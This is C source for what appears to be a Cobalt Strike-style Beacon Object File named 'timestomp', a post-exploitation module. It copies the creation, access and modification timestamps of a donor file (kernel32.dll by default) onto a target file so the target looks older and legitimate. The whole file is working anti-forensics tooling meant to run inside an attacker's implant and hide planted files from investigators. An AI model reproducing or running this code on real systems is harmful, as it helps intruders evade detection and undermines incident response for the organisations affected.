#include <windows.h>
#include "beacon_compat.h"

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    char *target = BeaconDataExtract(&parser, NULL);
    char *donor  = BeaconDataExtract(&parser, NULL);

    if (!target || !*target) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: timestomp --target PATH [--donor PATH]\n");
        return;
    }

    /* Build donor path */
    wchar_t wDonor[MAX_PATH] = {0};
    if (donor && *donor) {
        MultiByteToWideChar(CP_UTF8, 0, donor, -1, wDonor, MAX_PATH);
    } else {
        GetSystemDirectoryW(wDonor, MAX_PATH);
        wcscat(wDonor, L"\\kernel32.dll");
    }

    wchar_t wTarget[MAX_PATH] = {0};
    MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, MAX_PATH);

    /* Read timestamps from donor */
    HANDLE hDonor = CreateFileW(wDonor, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hDonor == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open donor: %lu\n", GetLastError());
        return;
    }

    FILETIME ftCreate, ftAccess, ftWrite;
    if (!GetFileTime(hDonor, &ftCreate, &ftAccess, &ftWrite)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetFileTime failed: %lu\n", GetLastError());
        CloseHandle(hDonor);
        return;
    }
    CloseHandle(hDonor);

    /* Apply to target */
    HANDLE hTarget = CreateFileW(wTarget, FILE_WRITE_ATTRIBUTES,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open target: %lu\n", GetLastError());
        return;
    }

    if (!SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SetFileTime failed: %lu\n", GetLastError());
        CloseHandle(hTarget);
        return;
    }
    CloseHandle(hTarget);

    /* Format timestamps for display */
    SYSTEMTIME st;
    FileTimeToSystemTime(&ftCreate, &st);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Timestomped: %s\n"
        "    Created:  %04d-%02d-%02d %02d:%02d:%02d\n",
        target,
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    FileTimeToSystemTime(&ftWrite, &st);
    BeaconPrintf(CALLBACK_OUTPUT,
        "    Modified: %04d-%02d-%02d %02d:%02d:%02d\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}
